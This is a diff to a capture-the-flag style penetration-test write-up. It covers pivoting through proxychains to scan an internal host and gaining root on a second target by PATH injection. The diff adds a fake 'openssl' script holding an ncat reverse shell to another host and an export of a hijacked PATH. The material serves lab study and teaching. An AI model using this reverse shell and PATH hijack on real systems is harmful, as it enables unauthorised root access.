@@ -290,7 +290,7 @@ As can be seen, this machine has access to `192.168.254.0/24` network. We use `s
 - `static_chain` is commented with `#` and `dynamic_chain` is uncommented
 - `socks4 127.0.0.1 20123` entry is appended at the bottom of the file 
 
-Now, nmap is run with proxychains and `-sT` flag so it works behind proxy:
+Now, nmap is run to `pki` host seen in `panel.php` with proxychains and `-sT` flag so it works behind proxy:
 ```console
 $ proxychains -q nmap -sT -sC -sV -v -oN nmap-254-3.res 192.168.254.3
 Nmap scan report for 192.168.254.3
@@ -442,13 +442,13 @@ $ ./cron.sh &
 
 ## Privilege escalation
 
-To monitor processes running on the target 2, [pspy](https://github.com/DominicBreuker/pspy) was transfered and executed:
+To monitor processes running on the **target 2**, [pspy](https://github.com/DominicBreuker/pspy) was transfered and executed:
 
 ![Pspy transferred](images/pspy-transfer.png) 
 ![Pspy running](images/pspy-running.png) 
 
 
-Going back to first discovery of the second target. When port 80 was accessed, output of some command was shown. It was `/usr/bin/ersatool`. New session was established to target 2 and we tried to run this:
+Going back to first discovery of the second target. When port 80 was accessed, output of some command was shown. It was `/usr/bin/ersatool`. New session was established to **target 2** and we tried to run this:
 
 ![ersatool](images/ersatool.png) 
 
@@ -458,20 +458,26 @@ During its execution, a few new entries showed in pspy output:
 
 Openssl can be seen there. What is important, is that it isn't using absolute path of `openssl` and is running with `UID=0` which is a user id of root. PATH injection attack may be performed.
 
-We switch to a path where we have `write` rights (e.g. `/tmp/`). We create `openssl` file and paste simple reverse shell code there:
+We switch to a path where we have `write` rights (e.g. `/tmp/`). We create `openssl` file, paste simple reverse shell code there and export new `PATH` environmental variable:
 ```console
 $ cd /tmp
 $ echo '#!/bin/bash' > openssl
 $ echo '/tmp/ncat 192.168.254.2 31337 -e /bin/bash' >> openssl
 $ chmod +x openssl
+$ export PATH=/tmp:$PATH
 ```
-Then, we set up listener on target 1 on port 51337 and we execute `/usr/bin/ersatool` on target 2 with `create` command. Connection is established to our ncat:
+Then, we set up listener on **target 1** on port 31337 and we executed `/usr/bin/ersatool` on **target 2** with `create` command:
+
+![ersatool hang](images/ersatool-hang.png) 
+
+Connection was established to our ncat listener on **target 1**:
  
 ![init root](images/initial-root.png) 
 
-This could be seen in pspy output:
+This could be seen in pspy output on **target 1**:
 
 ![pspy root](images/pspy-root-init.png) 
 
 We can read our flag:
+
 ![final shell](images/root-shell-full.png) 
